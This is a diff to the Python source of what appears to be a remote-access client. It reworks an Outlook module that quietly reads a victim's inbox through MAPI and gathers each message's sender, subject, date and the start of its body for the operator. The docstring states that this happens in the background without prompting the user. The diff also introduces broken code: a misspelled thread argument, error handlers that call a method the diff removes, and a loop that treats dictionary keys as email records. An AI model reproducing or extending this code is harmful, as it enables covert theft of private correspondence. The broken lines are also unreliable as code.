@@ -1933,7 +1933,7 @@ class Client(object):
     @config(platforms=['win32','darwin'], command=True, usage='email <option>')
     def email(self, args):
         """
-        access user's Outlook email in the background without opening it or prompting user
+        access user's Outlook email in the background
         """       
         mode, _, arg   = str(args).partition(' ')
         try:
@@ -1942,7 +1942,7 @@ class Client(object):
             if not getattr(self, '_email'):
                 self._email = Outlook()
             if not hasattr(self._email, mode):
-                return Outlook.help()
+                return json.dumps(Outlook.help())
             else:
                 return getattr(self._email, mode)(arg)
         except Exception as e2:
@@ -2348,7 +2348,8 @@ def main(*args, **kwargs):
 
 
 
-class Outlook():
+class Outlook(threading.Thread):
+    
     options = {
         "help"              : "show this usage help menu",
         "installed"         : "check if Outlook is installed on host device",
@@ -2357,12 +2358,15 @@ class Outlook():
     }
                 
     def __init__(self, *args, **kwargs):
-        if not Outlook.installed(): return
-        self.cache  = []
+        super(Outlook, self).__init__()
+        self._debug = kwargs.get('debug')
+        self._lock  = kwargs.get('lock')
         self.mapi   = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
         self.inbox  = self.mapi.GetDefaultFolder(6)
-        self.emails = self.inbox.Items
+        self.items  = self.inbox.Items
+        self.emails = {}
 
+                
     @staticmethod
     def installed(*args, **kwargs):
         try:
@@ -2371,33 +2375,58 @@ class Outlook():
         except: pass
         return False
 
+
     @staticmethod
     def help(*args, **kwargs):
-        return json.dumps(Outlook.options, indent=2)
-    
-    def dump(self, n=1):
+        return Outlook.options
+
+
+    def debug(self, data):
+        if self._debug and self._lock:
+            with self._lock:
+                try:
+                    print(bytes(data))
+                except Exception as e:
+                    print("{} error: {}".format(self.debug.func_name, str(e)))
+
+
+    def dump_inbox(self, n):
         n = 1 if bool(not n or not str(n).isdigit()) else int(n) 
         i = 0
         while i < n:
             try:
-                email = self.emails.GetNext()
+                email = self.items.GetNext()
                 sender   = email.SenderEmailAddress.encode('ascii','ignore')
                 message  = email.Body.encode('ascii','ignore')[:150] + '...'
                 subject  = email.Subject.encode('ascii','ignore')
                 received = str(email.ReceivedTime).replace('/','-').replace('\\','').replace(':','-').replace(' ','_')
                 result   = {'date': received, 'from': sender, 'subject': subject, 'message': message}
-                self.cache.append(result)
+                self.emails[i] = result
                 i += 1
                 if int(i) >= int(n):
                     break
             except Exception as e:
-                Client.debug("{} error: {}".format(self.dump.func_name, str(e)))
-        return "Dumped %d emails from Outlook to email cache for reading" % int(n)
+                self.debug("{} error: {}".format(self.dump.func_name, str(e)))
+        return "Dumped %d emails from Outlook to email" % int(n)
+
 
     def read(self, *args, **kwargs):
-        for data in self.cache:
-            max_len  = "{:<%d}" % int(max([len(i) for i in data.keys()]) + 2)
-            Client.debug(json.dumps({max_len.format(k): v for k,v in data.items()}, indent=2))
+        try:
+            output = []
+            for email in self.emails:
+                max_len  = "{:<%d}" % int(max([len(i) for i in email.keys()]) + 2)
+                output.append(json.dumps({max_len.format(k): v for k,v in email.items()},  indent=2))
+            return '\n'.join(output)
+        except Exception as e:
+            self.debug("{} error: {}".format(self.dump.func_name, str(e)))
+
+
+    def run(self):
+        t = threading.Thread(targete=self.dump_inbox)
+        t.daemon = True
+        t.start()
+
+
 
 
 if __name__ == '__main__':
